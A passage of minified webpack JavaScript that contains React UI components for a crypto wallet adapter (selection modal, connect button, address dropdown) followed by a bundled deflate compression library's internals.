                }, e.createElement("path", {
                    d: "M0.71418 1.626L5.83323 6.26188C5.91574 6.33657 6.0181 6.39652 6.13327 6.43762C6.24844 6.47872 6.37371 6.5 6.50048 6.5C6.62725 6.5 6.75252 6.47872 6.8677 6.43762C6.98287 6.39652 7.08523 6.33657 7.16774 6.26188L12.2868 1.626C12.7753 1.1835 12.3703 0.5 11.6195 0.5H1.37997C0.629216 0.5 0.224175 1.1835 0.71418 1.626Z"
                }))), e.createElement(ce, {
                    expanded: u,
                    id: "wallet-adapter-modal-collapse"
                }, e.createElement("ul", {
                    className: "wallet-adapter-modal-list"
                }, y.map((t => e.createElement(le, {
                    key: t.adapter.name,
                    handleClick: e => b(e, t.adapter.name),
                    tabIndex: u ? 0 : -1,
                    wallet: t
                })))))) : null))), e.createElement("div", {
                    className: "wallet-adapter-modal-overlay",
                    onMouseDown: w
                })), h)
            },
            de = t => {
                let {
                    children: n = "Select Wallet",
                    onClick: r,
                    ...i
                } = t;
                const {
                    visible: o,
                    setVisible: s
                } = ie(), a = (0, e.useCallback)((e => {
                    r && r(e), e.defaultPrevented || s(!o)
                }), [r, o]);
                return e.createElement(oe, {
                    className: "wallet-adapter-button-trigger",
                    onClick: a,
                    ...i
                }, n)
            },
            pe = t => {
                let {
                    children: n,
                    ...r
                } = t;
                const [i, o] = (0, e.useState)(!1);
                return e.createElement(re.Provider, {
                    value: {
                        visible: i,
                        setVisible: o
                    }
                }, n, i && e.createElement(he, { ...r
                }))
            },
            ye = t => {
                let {
                    children: n,
                    ...r
                } = t;
                const {
                    publicKey: i,
                    wallet: o,
                    disconnect: s
                } = T(), {
                    setVisible: a
                } = ie(), [u, c] = (0, e.useState)(!1), [l, f] = (0, e.useState)(!1), h = (0, e.useRef)(null), d = (0, e.useMemo)((() => null === i || void 0 === i ? void 0 : i.toBase58()), [i]), p = (0, e.useMemo)((() => n || (o && d ? d.slice(0, 4) + ".." + d.slice(-4) : null)), [n, o, d]), y = (0, e.useCallback)((async () => {
                    d && (await navigator.clipboard.writeText(d), c(!0), setTimeout((() => c(!1)), 400))
                }), [d]), g = (0, e.useCallback)((() => {
                    f(!0)
                }), []), m = (0, e.useCallback)((() => {
                    f(!1)
                }), []), w = (0, e.useCallback)((() => {
                    a(!0), m()
                }), [m]);
                return (0, e.useEffect)((() => {
                    const e = e => {
                        const t = h.current;
                        t && !t.contains(e.target) && m()
                    };
                    return document.addEventListener("mousedown", e), document.addEventListener("touchstart", e), () => {
                        document.removeEventListener("mousedown", e), document.removeEventListener("touchstart", e)
                    }
                }), [h, m]), o ? d ? e.createElement("div", {
                    className: "wallet-adapter-dropdown"
                }, e.createElement(oe, {
                    "aria-expanded": l,
                    className: "wallet-adapter-button-trigger",
                    style: {
                        pointerEvents: l ? "none" : "auto",
                        ...r.style
                    },
                    onClick: g,
                    startIcon: e.createElement(se, {
                        wallet: o
                    }),
                    ...r
                }, p), e.createElement("ul", {
                    "aria-label": "dropdown-list",
                    className: `wallet-adapter-dropdown-list ${l&&"wallet-adapter-dropdown-list-active"}`,
                    ref: h,
                    role: "menu"
                }, e.createElement("li", {
                    onClick: y,
                    className: "wallet-adapter-dropdown-list-item",
                    role: "menuitem"
                }, u ? "Copied" : "Copy address"), e.createElement("li", {
                    onClick: w,
                    className: "wallet-adapter-dropdown-list-item",
                    role: "menuitem"
                }, "Change wallet"), e.createElement("li", {
                    onClick: s,
                    className: "wallet-adapter-dropdown-list-item",
                    role: "menuitem"
                }, "Disconnect"))) : e.createElement(ae, { ...r
                }, n) : e.createElement(de, { ...r
                }, n)
            };
        var ge = __webpack_require__(9778),
            me = __webpack_require__(518),
            we = __webpack_require__.n(me),
            be = __webpack_require__(6315),
            ve = __webpack_require__.n(be),
            Ae = __webpack_require__(8034),
            ke = __webpack_require__.n(Ae),
            _e = __webpack_require__(4981),
            Ee = __webpack_require__(3472),
            Se = __webpack_require__(2009),
            Ie = __webpack_require__(8093),
            xe = __webpack_require__.n(Ie);

        function Me(e) {
            let t = e.length;
            for (; --t >= 0;) e[t] = 0
        }
        const Be = 256,
            Te = 286,
            Oe = 30,
            Ce = 15,
            Pe = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0]),
            Le = new Uint8Array([0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13]),
            Ne = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 3, 7]),
            Re = new Uint8Array([16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]),
            De = new Array(576);
        Me(De);
        const ze = new Array(60);
        Me(ze);
        const Ue = new Array(512);
        Me(Ue);
        const je = new Array(256);
        Me(je);
        const Fe = new Array(29);
        Me(Fe);
        const He = new Array(Oe);

        function We(e, t, n, r, i) {
            this.static_tree = e, this.extra_bits = t, this.extra_base = n, this.elems = r, this.max_length = i, this.has_stree = e && e.length
        }
        let Ke, qe, Ve;

        function Qe(e, t) {
            this.dyn_tree = e, this.max_code = 0, this.stat_desc = t
        }
        Me(He);
        const Ge = e => e < 256 ? Ue[e] : Ue[256 + (e >>> 7)],
            Ye = (e, t) => {
                e.pending_buf[e.pending++] = 255 & t, e.pending_buf[e.pending++] = t >>> 8 & 255
            },
            Ze = (e, t, n) => {
                e.bi_valid > 16 - n ? (e.bi_buf |= t << e.bi_valid & 65535, Ye(e, e.bi_buf), e.bi_buf = t >> 16 - e.bi_valid, e.bi_valid += n - 16) : (e.bi_buf |= t << e.bi_valid & 65535, e.bi_valid += n)
            },
            Je = (e, t, n) => {
                Ze(e, n[2 * t], n[2 * t + 1])
            },
            Xe = (e, t) => {
                let n = 0;
                do {
                    n |= 1 & e, e >>>= 1, n <<= 1
                } while (--t > 0);
                return n >>> 1
            },
            $e = (e, t, n) => {
                const r = new Array(16);
                let i, o, s = 0;
                for (i = 1; i <= Ce; i++) r[i] = s = s + n[i - 1] << 1;
                for (o = 0; o <= t; o++) {
                    let t = e[2 * o + 1];
                    0 !== t && (e[2 * o] = Xe(r[t]++, t))
                }
            },
            et = e => {
                let t;
                for (t = 0; t < Te; t++) e.dyn_ltree[2 * t] = 0;
                for (t = 0; t < Oe; t++) e.dyn_dtree[2 * t] = 0;
                for (t = 0; t < 19; t++) e.bl_tree[2 * t] = 0;
                e.dyn_ltree[512] = 1, e.opt_len = e.static_len = 0, e.last_lit = e.matches = 0
            },
            tt = e => {
                e.bi_valid > 8 ? Ye(e, e.bi_buf) : e.bi_valid > 0 && (e.pending_buf[e.pending++] = e.bi_buf), e.bi_buf = 0, e.bi_valid = 0
            },
            nt = (e, t, n, r) => {
                const i = 2 * t,
                    o = 2 * n;
                return e[i] < e[o] || e[i] === e[o] && r[t] <= r[n]
            },
            rt = (e, t, n) => {
                const r = e.heap[n];
                let i = n << 1;
                for (; i <= e.heap_len && (i < e.heap_len && nt(t, e.heap[i + 1], e.heap[i], e.depth) && i++, !nt(t, r, e.heap[i], e.depth));) e.heap[n] = e.heap[i], n = i, i <<= 1;
                e.heap[n] = r
            },
            it = (e, t, n) => {
                let r, i, o, s, a = 0;
                if (0 !== e.last_lit)
                    do {
                        r = e.pending_buf[e.d_buf + 2 * a] << 8 | e.pending_buf[e.d_buf + 2 * a + 1], i = e.pending_buf[e.l_buf + a], a++, 0 === r ? Je(e, i, t) : (o = je[i], Je(e, o + Be + 1, t), s = Pe[o], 0 !== s && (i -= Fe[o], Ze(e, i, s)), r--, o = Ge(r), Je(e, o, n), s = Le[o], 0 !== s && (r -= He[o], Ze(e, r, s)))
                    } while (a < e.last_lit);
                Je(e, 256, t)
            },
            ot = (e, t) => {
                const n = t.dyn_tree,
                    r = t.stat_desc.static_tree,
                    i = t.stat_desc.has_stree,
                    o = t.stat_desc.elems;
                let s, a, u, c = -1;
                for (e.heap_len = 0, e.heap_max = 573, s = 0; s < o; s++) 0 !== n[2 * s] ? (e.heap[++e.heap_len] = c = s, e.depth[s] = 0) : n[2 * s + 1] = 0;
                for (; e.heap_len < 2;) u = e.heap[++e.heap_len] = c < 2 ? ++c : 0, n[2 * u] = 1, e.depth[u] = 0, e.opt_len--, i && (e.static_len -= r[2 * u + 1]);
                for (t.max_code = c, s = e.heap_len >> 1; s >= 1; s--) rt(e, n, s);
                u = o;
                do {
                    s = e.heap[1], e.heap[1] = e.heap[e.heap_len--], rt(e, n, 1), a = e.heap[1], e.heap[--e.heap_max] = s, e.heap[--e.heap_max] = a, n[2 * u] = n[2 * s] + n[2 * a], e.depth[u] = (e.depth[s] >= e.depth[a] ? e.depth[s] : e.depth[a]) + 1, n[2 * s + 1] = n[2 * a + 1] = u, e.heap[1] = u++, rt(e, n, 1)
                } while (e.heap_len >= 2);
                e.heap[--e.heap_max] = e.heap[1], ((e, t) => {
                    const n = t.dyn_tree,
                        r = t.max_code,
                        i = t.stat_desc.static_tree,
                        o = t.stat_desc.has_stree,
                        s = t.stat_desc.extra_bits,
                        a = t.stat_desc.extra_base,
                        u = t.stat_desc.max_length;
                    let c, l, f, h, d, p, y = 0;
                    for (h = 0; h <= Ce; h++) e.bl_count[h] = 0;
                    for (n[2 * e.heap[e.heap_max] + 1] = 0, c = e.heap_max + 1; c < 573; c++) l = e.heap[c], h = n[2 * n[2 * l + 1] + 1] + 1, h > u && (h = u, y++), n[2 * l + 1] = h, l > r || (e.bl_count[h]++, d = 0, l >= a && (d = s[l - a]), p = n[2 * l], e.opt_len += p * (h + d), o && (e.static_len += p * (i[2 * l + 1] + d)));
                    if (0 !== y) {
                        do {
                            for (h = u - 1; 0 === e.bl_count[h];) h--;
                            e.bl_count[h]--, e.bl_count[h + 1] += 2, e.bl_count[u]--, y -= 2
                        } while (y > 0);
                        for (h = u; 0 !== h; h--)
                            for (l = e.bl_count[h]; 0 !== l;) f = e.heap[--c], f > r || (n[2 * f + 1] !== h && (e.opt_len += (h - n[2 * f + 1]) * n[2 * f], n[2 * f + 1] = h), l--)
                    }
                })(e, t), $e(n, c, e.bl_count)
            },
            st = (e, t, n) => {
                let r, i, o = -1,
                    s = t[1],
                    a = 0,
                    u = 7,
                    c = 4;
                for (0 === s && (u = 138, c = 3), t[2 * (n + 1) + 1] = 65535, r = 0; r <= n; r++) i = s, s = t[2 * (r + 1) + 1], ++a < u && i === s || (a < c ? e.bl_tree[2 * i] += a : 0 !== i ? (i !== o && e.bl_tree[2 * i]++, e.bl_tree[32]++) : a <= 10 ? e.bl_tree[34]++ : e.bl_tree[36]++, a = 0, o = i, 0 === s ? (u = 138, c = 3) : i === s ? (u = 6, c = 3) : (u = 7, c = 4))
            },
            at = (e, t, n) => {
                let r, i, o = -1,
                    s = t[1],
                    a = 0,
                    u = 7,
                    c = 4;
                for (0 === s && (u = 138, c = 3), r = 0; r <= n; r++)
                    if (i = s, s = t[2 * (r + 1) + 1], !(++a < u && i === s)) {
                        if (a < c)
                            do {
                                Je(e, i, e.bl_tree)
                            } while (0 !== --a);
                        else 0 !== i ? (i !== o && (Je(e, i, e.bl_tree), a--), Je(e, 16, e.bl_tree), Ze(e, a - 3, 2)) : a <= 10 ? (Je(e, 17, e.bl_tree), Ze(e, a - 3, 3)) : (Je(e, 18, e.bl_tree), Ze(e, a - 11, 7));
                        a = 0, o = i, 0 === s ? (u = 138, c = 3) : i === s ? (u = 6, c = 3) : (u = 7, c = 4)
                    }
            };
        let ut = !1;
        const ct = (e, t, n, r) => {
            Ze(e, 0 + (r ? 1 : 0), 3), ((e, t, n, r) => {
                tt(e), r && (Ye(e, n), Ye(e, ~n)), e.pending_buf.set(e.window.subarray(t, t + n), e.pending), e.pending += n
            })(e, t, n, !0)
        };
        var lt = e => {
                ut || ((() => {
                    let e, t, n, r, i;
                    const o = new Array(16);
                    for (n = 0, r = 0; r < 28; r++)
                        for (Fe[r] = n, e = 0; e < 1 << Pe[r]; e++) je[n++] = r;
                    for (je[n - 1] = r, i = 0, r = 0; r < 16; r++)
                        for (He[r] = i, e = 0; e < 1 << Le[r]; e++) Ue[i++] = r;
                    for (i >>= 7; r < Oe; r++)
                        for (He[r] = i << 7, e = 0; e < 1 << Le[r] - 7; e++) Ue[256 + i++] = r;
                    for (t = 0; t <= Ce; t++) o[t] = 0;
                    for (e = 0; e <= 143;) De[2 * e + 1] = 8, e++, o[8]++;
                    for (; e <= 255;) De[2 * e + 1] = 9, e++, o[9]++;
                    for (; e <= 279;) De[2 * e + 1] = 7, e++, o[7]++;
                    for (; e <= 287;) De[2 * e + 1] = 8, e++, o[8]++;
                    for ($e(De, 287, o), e = 0; e < Oe; e++) ze[2 * e + 1] = 5, ze[2 * e] = Xe(e, 5);
                    Ke = new We(De, Pe, 257, Te, Ce), qe = new We(ze, Le, 0, Oe, Ce), Ve = new We(new Array(0), Ne, 0, 19, 7)
                })(), ut = !0), e.l_desc = new Qe(e.dyn_ltree, Ke), e.d_desc = new Qe(e.dyn_dtree, qe), e.bl_desc = new Qe(e.bl_tree, Ve), e.bi_buf = 0, e.bi_valid = 0, et(e)
            },
            ft = (e, t, n, r) => {
                let i, o, s = 0;
                e.level > 0 ? (2 === e.strm.data_type && (e.strm.data_type = (e => {
                    let t, n = 4093624447;
                    for (t = 0; t <= 31; t++, n >>>= 1)
                        if (1 & n && 0 !== e.dyn_ltree[2 * t]) return 0;
                    if (0 !== e.dyn_ltree[18] || 0 !== e.dyn_ltree[20] || 0 !== e.dyn_ltree[26]) return 1;
                    for (t = 32; t < Be; t++)
                        if (0 !== e.dyn_ltree[2 * t]) return 1;
                    return 0
                })(e)), ot(e, e.l_desc), ot(e, e.d_desc), s = (e => {
                    let t;
                    for (st(e, e.dyn_ltree, e.l_desc.max_code), st(e, e.dyn_dtree, e.d_desc.max_code), ot(e, e.bl_desc), t = 18; t >= 3 && 0 === e.bl_tree[2 * Re[t] + 1]; t--);
                    return e.opt_len += 3 * (t + 1) + 5 + 5 + 4, t
                })(e), i = e.opt_len + 3 + 7 >>> 3, o = e.static_len + 3 + 7 >>> 3, o <= i && (i = o)) : i = o = n + 5, n + 4 <= i && -1 !== t ? ct(e, t, n, r) : 4 === e.strategy || o === i ? (Ze(e, 2 + (r ? 1 : 0), 3), it(e, De, ze)) : (Ze(e, 4 + (r ? 1 : 0), 3), ((e, t, n, r) => {
                    let i;
                    for (Ze(e, t - 257, 5), Ze(e, n - 1, 5), Ze(e, r - 4, 4), i = 0; i < r; i++) Ze(e, e.bl_tree[2 * Re[i] + 1], 3);
                    at(e, e.dyn_ltree, t - 1), at(e, e.dyn_dtree, n - 1)
                })(e, e.l_desc.max_code + 1, e.d_desc.max_code + 1, s + 1), it(e, e.dyn_ltree, e.dyn_dtree)), et(e), r && tt(e)
            },
            ht = {
                _tr_init: lt,
                _tr_stored_block: ct,
                _tr_flush_block: ft,
                _tr_tally: (e, t, n) => (e.pending_buf[e.d_buf + 2 * e.last_lit] = t >>> 8 & 255, e.pending_buf[e.d_buf + 2 * e.last_lit + 1] = 255 & t, e.pending_buf[e.l_buf + e.last_lit] = 255 & n, e.last_lit++, 0 === t ? e.dyn_ltree[2 * n]++ : (e.matches++, t--, e.dyn_ltree[2 * (je[n] + Be + 1)]++, e.dyn_dtree[2 * Ge(t)]++), e.last_lit === e.lit_bufsize - 1),
                _tr_align: e => {
                    Ze(e, 2, 3), Je(e, 256, De), (e => {
                        16 === e.bi_valid ? (Ye(e, e.bi_buf), e.bi_buf = 0, e.bi_valid = 0) : e.bi_valid >= 8 && (e.pending_buf[e.pending++] = 255 & e.bi_buf, e.bi_buf >>= 8, e.bi_valid -= 8)
                    })(e)
                }
            };
        var dt = (e, t, n, r) => {
            let i = 65535 & e | 0,
                o = e >>> 16 & 65535 | 0,
                s = 0;
            for (; 0 !== n;) {
                s = n > 2e3 ? 2e3 : n, n -= s;
                do {
                    i = i + t[r++] | 0, o = o + i | 0
                } while (--s);
                i %= 65521, o %= 65521
            }
            return i | o << 16 | 0
        };
        const pt = new Uint32Array((() => {
            let e, t = [];
            for (var n = 0; n < 256; n++) {
                e = n;
                for (var r = 0; r < 8; r++) e = 1 & e ? 3988292384 ^ e >>> 1 : e >>> 1;
                t[n] = e
            }
            return t
        })());
        var yt = (e, t, n, r) => {
                const i = pt,
                    o = r + n;
                e ^= -1;
                for (let s = r; s < o; s++) e = e >>> 8 ^ i[255 & (e ^ t[s])];
                return -1 ^ e
            },
            gt = {
                2: "need dictionary",
                1: "stream end",
                0: "",
                "-1": "file error",
                "-2": "stream error",
                "-3": "data error",
                "-4": "insufficient memory",
                "-5": "buffer error",
                "-6": "incompatible version"
            },
            mt = {
                Z_NO_FLUSH: 0,
                Z_PARTIAL_FLUSH: 1,
                Z_SYNC_FLUSH: 2,
                Z_FULL_FLUSH: 3,
                Z_FINISH: 4,
                Z_BLOCK: 5,
                Z_TREES: 6,
                Z_OK: 0,
                Z_STREAM_END: 1,
                Z_NEED_DICT: 2,
                Z_ERRNO: -1,
                Z_STREAM_ERROR: -2,
                Z_DATA_ERROR: -3,
                Z_MEM_ERROR: -4,
                Z_BUF_ERROR: -5,
                Z_NO_COMPRESSION: 0,
                Z_BEST_SPEED: 1,
                Z_BEST_COMPRESSION: 9,
                Z_DEFAULT_COMPRESSION: -1,
                Z_FILTERED: 1,
                Z_HUFFMAN_ONLY: 2,
                Z_RLE: 3,
                Z_FIXED: 4,
                Z_DEFAULT_STRATEGY: 0,
                Z_BINARY: 0,
                Z_TEXT: 1,
                Z_UNKNOWN: 2,
                Z_DEFLATED: 8
            };
        const {
            _tr_init: wt,
            _tr_stored_block: bt,
            _tr_flush_block: vt,
            _tr_tally: At,
            _tr_align: kt
        } = ht, {
            Z_NO_FLUSH: _t,
            Z_PARTIAL_FLUSH: Et,
            Z_FULL_FLUSH: St,
            Z_FINISH: It,
            Z_BLOCK: xt,
            Z_OK: Mt,
            Z_STREAM_END: Bt,
            Z_STREAM_ERROR: Tt,
            Z_DATA_ERROR: Ot,
            Z_BUF_ERROR: Ct,
            Z_DEFAULT_COMPRESSION: Pt,
            Z_FILTERED: Lt,
            Z_HUFFMAN_ONLY: Nt,
            Z_RLE: Rt,
            Z_FIXED: Dt,
            Z_DEFAULT_STRATEGY: zt,
            Z_UNKNOWN: Ut,
            Z_DEFLATED: jt
        } = mt, Ft = 258, Ht = 262, Wt = 103, Kt = 113, qt = 666, Vt = (e, t) => (e.msg = gt[t], t), Qt = e => (e << 1) - (e > 4 ? 9 : 0), Gt = e => {
            let t = e.length;
            for (; --t >= 0;) e[t] = 0
        };
        let Yt = (e, t, n) => (t << e.hash_shift ^ n) & e.hash_mask;
        const Zt = e => {
                const t = e.state;
                let n = t.pending;
                n > e.avail_out && (n = e.avail_out), 0 !== n && (e.output.set(t.pending_buf.subarray(t.pending_out, t.pending_out + n), e.next_out), e.next_out += n, t.pending_out += n, e.total_out += n, e.avail_out -= n, t.pending -= n, 0 === t.pending && (t.pending_out = 0))
            },
            Jt = (e, t) => {
                vt(e, e.block_start >= 0 ? e.block_start : -1, e.strstart - e.block_start, t), e.block_start = e.strstart, Zt(e.strm)
            },
            Xt = (e, t) => {
                e.pending_buf[e.pending++] = t
            },
            $t = (e, t) => {
                e.pending_buf[e.pending++] = t >>> 8 & 255, e.pending_buf[e.pending++] = 255 & t
            },
            en = (e, t, n, r) => {
                let i = e.avail_in;
                return i > r && (i = r), 0 === i ? 0 : (e.avail_in -= i, t.set(e.input.subarray(e.next_in, e.next_in + i), n), 1 === e.state.wrap ? e.adler = dt(e.adler, t, i, n) : 2 === e.state.wrap && (e.adler = yt(e.adler, t, i, n)), e.next_in += i, e.total_in += i, i)
            },
            tn = (e, t) => {
                let n, r, i = e.max_chain_length,
                    o = e.strstart,
                    s = e.prev_length,
                    a = e.nice_match;
                const u = e.strstart > e.w_size - Ht ? e.strstart - (e.w_size - Ht) : 0,
                    c = e.window,
                    l = e.w_mask,
                    f = e.prev,
                    h = e.strstart + Ft;
                let d = c[o + s - 1],
                    p = c[o + s];
                e.prev_length >= e.good_match && (i >>= 2), a > e.lookahead && (a = e.lookahead);
                do {
                    if (n = t, c[n + s] === p && c[n + s - 1] === d && c[n] === c[o] && c[++n] === c[o + 1]) {
                        o += 2, n++;
                        do {} while (c[++o] === c[++n] && c[++o] === c[++n] && c[++o] === c[++n] && c[++o] === c[++n] && c[++o] === c[++n] && c[++o] === c[++n] && c[++o] === c[++n] && c[++o] === c[++n] && o < h);
                        if (r = Ft - (h - o), o = h - Ft, r > s) {
                            if (e.match_start = t, s = r, r >= a) break;
                            d = c[o + s - 1], p = c[o + s]
                        }
                    }
                } while ((t = f[t & l]) > u && 0 !== --i);
                return s <= e.lookahead ? s : e.lookahead
            },
            nn = e => {
                const t = e.w_size;
                let n, r, i, o, s;
                do {
                    if (o = e.window_size - e.lookahead - e.strstart, e.strstart >= t + (t - Ht)) {
                        e.window.set(e.window.subarray(t, t + t), 0), e.match_start -= t, e.strstart -= t, e.block_start -= t, r = e.hash_size, n = r;
                        do {
                            i = e.head[--n], e.head[n] = i >= t ? i - t : 0
                        } while (--r);
                        r = t, n = r;
                        do {
                            i = e.prev[--n], e.prev[n] = i >= t ? i - t : 0
                        } while (--r);
                        o += t
                    }
                    if (0 === e.strm.avail_in) break;
                    if (r = en(e.strm, e.window, e.strstart + e.lookahead, o), e.lookahead += r, e.lookahead + e.insert >= 3)
                        for (s = e.strstart - e.insert, e.ins_h = e.window[s], e.ins_h = Yt(e, e.ins_h, e.window[s + 1]); e.insert && (e.ins_h = Yt(e, e.ins_h, e.window[s + 3 - 1]), e.prev[s & e.w_mask] = e.head[e.ins_h], e.head[e.ins_h] = s, s++, e.insert--, !(e.lookahead + e.insert < 3)););
                } while (e.lookahead < Ht && 0 !== e.strm.avail_in)
            },
            rn = (e, t) => {
                let n, r;
                for (;;) {
                    if (e.lookahead < Ht) {
                        if (nn(e), e.lookahead < Ht && t === _t) return 1;
                        if (0 === e.lookahead) break
                    }
                    if (n = 0, e.lookahead >= 3 && (e.ins_h = Yt(e, e.ins_h, e.window[e.strstart + 3 - 1]), n = e.prev[e.strstart & e.w_mask] = e.head[e.ins_h], e.head[e.ins_h] = e.strstart), 0 !== n && e.strstart - n <= e.w_size - Ht && (e.match_length = tn(e, n)), e.match_length >= 3)
                        if (r = At(e, e.strstart - e.match_start, e.match_length - 3), e.lookahead -= e.match_length, e.match_length <= e.max_lazy_match && e.lookahead >= 3) {
                            e.match_length--;
                            do {
                                e.strstart++, e.ins_h = Yt(e, e.ins_h, e.window[e.strstart + 3 - 1]), n = e.prev[e.strstart & e.w_mask] = e.head[e.ins_h], e.head[e.ins_h] = e.strstart
                            } while (0 !== --e.match_length);
                            e.strstart++
                        } else e.strstart += e.match_length, e.match_length = 0, e.ins_h = e.window[e.strstart], e.ins_h = Yt(e, e.ins_h, e.window[e.strstart + 1]);
                    else r = At(e, 0, e.window[e.strstart]), e.lookahead--, e.strstart++;
                    if (r && (Jt(e, !1), 0 === e.strm.avail_out)) return 1
                }
                return e.insert = e.strstart < 2 ? e.strstart : 2, t === It ? (Jt(e, !0), 0 === e.strm.avail_out ? 3 : 4) : e.last_lit && (Jt(e, !1), 0 === e.strm.avail_out) ? 1 : 2
            },
            on = (e, t) => {
                let n, r, i;
                for (;;) {
                    if (e.lookahead < Ht) {
                        if (nn(e), e.lookahead < Ht && t === _t) return 1;
                        if (0 === e.lookahead) break
                    }
                    if (n = 0, e.lookahead >= 3 && (e.ins_h = Yt(e, e.ins_h, e.window[e.strstart + 3 - 1]), n = e.prev[e.strstart & e.w_mask] = e.head[e.ins_h], e.head[e.ins_h] = e.strstart), e.prev_length = e.match_length, e.prev_match = e.match_start, e.match_length = 2, 0 !== n && e.prev_length < e.max_lazy_match && e.strstart - n <= e.w_size - Ht && (e.match_length = tn(e, n), e.match_length <= 5 && (e.strategy === Lt || 3 === e.match_length && e.strstart - e.match_start > 4096) && (e.match_length = 2)), e.prev_length >= 3 && e.match_length <= e.prev_length) {
                        i = e.strstart + e.lookahead - 3, r = At(e, e.strstart - 1 - e.prev_match, e.prev_length - 3), e.lookahead -= e.prev_length - 1, e.prev_length -= 2;
                        do {
                            ++e.strstart <= i && (e.ins_h = Yt(e, e.ins_h, e.window[e.strstart + 3 - 1]), n = e.prev[e.strstart & e.w_mask] = e.head[e.ins_h], e.head[e.ins_h] = e.strstart)
                        } while (0 !== --e.prev_length);
                        if (e.match_available = 0, e.match_length = 2, e.strstart++, r && (Jt(e, !1), 0 === e.strm.avail_out)) return 1
                    } else if (e.match_available) {
                        if (r = At(e, 0, e.window[e.strstart - 1]), r && Jt(e, !1), e.strstart++, e.lookahead--, 0 === e.strm.avail_out) return 1
                    } else e.match_available = 1, e.strstart++, e.lookahead--
                }
                return e.match_available && (r = At(e, 0, e.window[e.strstart - 1]), e.match_available = 0), e.insert = e.strstart < 2 ? e.strstart : 2, t === It ? (Jt(e, !0), 0 === e.strm.avail_out ? 3 : 4) : e.last_lit && (Jt(e, !1), 0 === e.strm.avail_out) ? 1 : 2
            };

        function sn(e, t, n, r, i) {
            this.good_length = e, this.max_lazy = t, this.nice_length = n, this.max_chain = r, this.func = i
        }
        const an = [new sn(0, 0, 0, 0, ((e, t) => {
            let n = 65535;
            for (n > e.pending_buf_size - 5 && (n = e.pending_buf_size - 5);;) {
                if (e.lookahead <= 1) {
                    if (nn(e), 0 === e.lookahead && t === _t) return 1;
                    if (0 === e.lookahead) break
                }
                e.strstart += e.lookahead, e.lookahead = 0;
                const r = e.block_start + n;
                if ((0 === e.strstart || e.strstart >= r) && (e.lookahead = e.strstart - r, e.strstart = r, Jt(e, !1), 0 === e.strm.avail_out)) return 1;
                if (e.strstart - e.block_start >= e.w_size - Ht && (Jt(e, !1), 0 === e.strm.avail_out)) return 1
            }
            return e.insert = 0, t === It ? (Jt(e, !0), 0 === e.strm.avail_out ? 3 : 4) : (e.strstart > e.block_start && (Jt(e, !1), e.strm.avail_out), 1)
        })), new sn(4, 4, 8, 4, rn), new sn(4, 5, 16, 8, rn), new sn(4, 6, 32, 32, rn), new sn(4, 4, 16, 16, on), new sn(8, 16, 32, 32, on), new sn(8, 16, 128, 128, on), new sn(8, 32, 128, 256, on), new sn(32, 128, 258, 1024, on), new sn(32, 258, 258, 4096, on)];

        function un() {
            this.strm = null, this.status = 0, this.pending_buf = null, this.pending_buf_size = 0, this.pending_out = 0, this.pending = 0, this.wrap = 0, this.gzhead = null, this.gzindex = 0, this.method = jt, this.last_flush = -1, this.w_size = 0, this.w_bits = 0, this.w_mask = 0, this.window = null, this.window_size = 0, this.prev = null, this.head = null, this.ins_h = 0, this.hash_size = 0, this.hash_bits = 0, this.hash_mask = 0, this.hash_shift = 0, this.block_start = 0, this.match_length = 0, this.prev_match = 0, this.match_available = 0, this.strstart = 0, this.match_start = 0, this.lookahead = 0, this.prev_length = 0, this.max_chain_length = 0, this.max_lazy_match = 0, this.level = 0, this.strategy = 0, this.good_match = 0, this.nice_match = 0, this.dyn_ltree = new Uint16Array(1146), this.dyn_dtree = new Uint16Array(122), this.bl_tree = new Uint16Array(78), Gt(this.dyn_ltree), Gt(this.dyn_dtree), Gt(this.bl_tree), this.l_desc = null, this.d_desc = null, this.bl_desc = null, this.bl_count = new Uint16Array(16), this.heap = new Uint16Array(573), Gt(this.heap), this.heap_len = 0, this.heap_max = 0, this.depth = new Uint16Array(573), Gt(this.depth), this.l_buf = 0, this.lit_bufsize = 0, this.last_lit = 0, this.d_buf = 0, this.opt_len = 0, this.static_len = 0, this.matches = 0, this.insert = 0, this.bi_buf = 0, this.bi_valid = 0
        }
        const cn = e => {
                if (!e || !e.state) return Vt(e, Tt);
                e.total_in = e.total_out = 0, e.data_type = Ut;
                const t = e.state;
                return t.pending = 0, t.pending_out = 0, t.wrap < 0 && (t.wrap = -t.wrap), t.status = t.wrap ? 42 : Kt, e.adler = 2 === t.wrap ? 0 : 1, t.last_flush = _t, wt(t), Mt
            },
            ln = e => {
                const t = cn(e);
                var n;
                return t === Mt && ((n = e.state).window_size = 2 * n.w_size, Gt(n.head), n.max_lazy_match = an[n.level].max_lazy, n.good_match = an[n.level].good_length, n.nice_match = an[n.level].nice_length, n.max_chain_length = an[n.level].max_chain, n.strstart = 0, n.block_start = 0, n.lookahead = 0, n.insert = 0, n.match_length = n.prev_length = 2, n.match_available = 0, n.ins_h = 0), t
            },
            fn = (e, t, n, r, i, o) => {
                if (!e) return Tt;
                let s = 1;
                if (t === Pt && (t = 6), r < 0 ? (s = 0, r = -r) : r > 15 && (s = 2, r -= 16), i < 1 || i > 9 || n !== jt || r < 8 || r > 15 || t < 0 || t > 9 || o < 0 || o > Dt) return Vt(e, Tt);
                8 === r && (r = 9);
                const a = new un;
                return e.state = a, a.strm = e, a.wrap = s, a.gzhead = null, a.w_bits = r, a.w_size = 1 << a.w_bits, a.w_mask = a.w_size - 1, a.hash_bits = i + 7, a.hash_size = 1 << a.hash_bits, a.hash_mask = a.hash_size - 1, a.hash_shift = ~~((a.hash_bits + 3 - 1) / 3), a.window = new Uint8Array(2 * a.w_size), a.head = new Uint16Array(a.hash_size), a.prev = new Uint16Array(a.w_size), a.lit_bufsize = 1 << i + 6, a.pending_buf_size = 4 * a.lit_bufsize, a.pending_buf = new Uint8Array(a.pending_buf_size), a.d_buf = 1 * a.lit_bufsize, a.l_buf = 3 * a.lit_bufsize, a.level = t, a.strategy = o, a.method = n, ln(e)
            };
        var hn = {
            deflateInit: (e, t) => fn(e, t, jt, 15, 8, zt),
            deflateInit2: fn,
            deflateReset: ln,
